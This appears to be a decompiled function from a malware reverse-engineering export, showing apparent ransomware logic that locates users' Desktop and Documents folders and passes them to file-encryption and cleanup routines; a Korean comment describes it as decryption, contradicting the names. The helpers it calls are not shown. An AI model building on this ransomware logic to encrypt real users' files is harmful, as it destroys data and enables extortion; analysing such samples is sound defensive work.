// --- Metadata ---
// Function Name: encryptUserDirectories_10005480
// Address: 0x10005480
// Exported At: 20250522_122243
// Signature: unknown_signature
// ---------------
int __cdecl encryptUserDirectories_10005480(_DWORD *a1)
{
  WCHAR pszPath; // [esp+Ch] [ebp-208h] BYREF
  char v3[516]; // [esp+Eh] [ebp-206h] BYREF
  __int16 v4; // [esp+212h] [ebp-2h]

  pszPath = word_1000D918;
  memset(v3, 0, sizeof(v3));
  v4 = 0;
  SHGetFolderPathW(0, 0, 0, 0, &pszPath);       // 복호화 타겟 디렉터리를 순차적으로 스캔하며 조건에 따라 파일 복호화
  if ( wcslen(&pszPath) )
    encryptAndCleanupFiles_100027F0(a1, &pszPath, 1);
  pszPath = 0;
  SHGetFolderPathW(0, 5, 0, 0, &pszPath);
  if ( wcslen(&pszPath) )
    encryptAndCleanupFiles_100027F0(a1, &pszPath, 1);
  ScanUserDirs_10004A40(25, (int)encryptIfTargetUser_100053F0, (int)a1);
  return ScanUserDirs_10004A40(46, (int)encryptIfTargetUser_100053F0, (int)a1);
}
